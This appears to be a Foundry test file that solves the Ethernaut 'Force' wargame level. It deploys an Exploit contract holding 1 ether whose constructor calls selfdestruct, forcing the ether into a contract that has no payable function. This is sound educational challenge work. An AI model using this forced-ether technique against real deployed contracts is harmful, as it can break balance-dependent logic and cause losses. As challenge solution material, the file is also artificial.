// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Force.sol";
import "../src/levels/ForceFactory.sol";
import "./utils/BaseTest.sol";

contract TestForce is BaseTest{
    Force level;

    constructor() public{
        levelFactory = new ForceFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);

        assertEq(address(level).balance, 0);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        
        Exploit exploiter = new Exploit{value:1 ether}(payable(address(level)));
        assertEq(address(level).balance,1 ether);

        vm.stopPrank();
    }
}

contract Exploit{
    constructor(address payable _contract) payable public{
        selfdestruct(_contract);
    }
}